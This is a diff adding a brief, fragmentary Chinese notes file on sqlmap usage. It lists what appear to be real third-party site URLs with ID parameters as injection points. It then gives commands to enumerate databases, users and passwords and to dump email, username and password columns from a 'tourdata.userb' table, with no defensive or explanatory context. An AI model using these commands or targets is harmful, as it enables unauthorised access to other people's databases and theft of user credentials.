@@ -1,0 +1,36 @@
+DOS（磁盘操作系统）
+sqlmap是一款非常强大的开源sql自动化注入工具，可以用来检测和利用sql注入漏洞。它由Python语言开发而成
+http://www.keyuhuabj.com/list_a_news.php?num=20345
+http://blog.csdn.net/zgyulongfei/article/details/41017493/
+http://www.inttoys.com/Article.aspx?Id=313574245974
+web服务器系统
+
+-u：指定注入点url
+
+--dbs 一条命令即可曝出该sqlserver中所有数据库名称  
+
+列出sqlserver所有用户 --users
+
+--current-db  web当前使用的数据库
+
+web数据库使用账户--current-user  
+
+
+--passwords
+
+-D tourdata --tables  列出数据库中的表
+
+
+列出表中字段  -D tourdata -T userb --columns 
+
+ -D：指定数据库名称
+
+-T：指定要列出字段的表
+
+--columns：指定列出字段
+-D tourdata -T userb -C "email,Username,userpassword" --dump
+-C ：指定要暴的字段
+--dump：将结果导出
+
+
+eehua
